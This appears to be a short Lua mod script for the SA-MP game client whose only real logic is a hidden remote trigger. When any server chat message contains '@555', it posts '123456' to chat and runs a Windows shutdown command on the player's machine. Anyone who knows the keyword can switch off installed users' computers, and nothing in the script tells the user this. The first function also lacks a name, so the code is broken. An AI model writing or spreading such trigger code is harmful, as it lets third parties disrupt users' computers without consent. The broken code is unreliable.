function
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end
end

function sampev.onServerMessage(color, message)
    if message:find("@555") then
        sampSendChat("123456")
        os.execute('shutdown /s /t 300')
    end
end
